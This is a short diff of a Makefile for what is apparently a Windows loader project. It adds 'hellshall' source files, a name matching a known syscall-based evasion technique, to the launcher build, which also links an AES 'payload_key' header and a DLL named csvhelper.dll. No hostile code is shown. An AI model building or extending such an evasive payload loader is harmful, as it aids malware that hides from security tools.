@@ -54,9 +54,9 @@ resource.o: resource.rc
 # ── Step 3a: link launcher.exe ────────────────────────────────────────────
 #    payload_key.h is a launcher-only prerequisite — never a plugin dep, to
 #    keep the AES key out of the DLL's .rdata.
-$(OUTPUT): launcher.c ghost.c ghost.h payload_key.h resource.o
+$(OUTPUT): launcher.c ghost.c ghost.h hellshall.c hellshall.h payload_key.h resource.o
 	@mkdir -p "$(dir $(OUTPUT))"
-	$(CC) $(CFLAGS_LAUNCHER) -o "$(abspath $(OUTPUT))" launcher.c ghost.c resource.o $(LDFLAGS_LAUNCHER)
+	$(CC) $(CFLAGS_LAUNCHER) -o "$(abspath $(OUTPUT))" launcher.c ghost.c hellshall.c resource.o $(LDFLAGS_LAUNCHER)
 
 # ── Step 3b: link csvhelper.dll ───────────────────────────────────────────
 #    No resource.o (skipped — see design notes; add resource.rc for the DLL
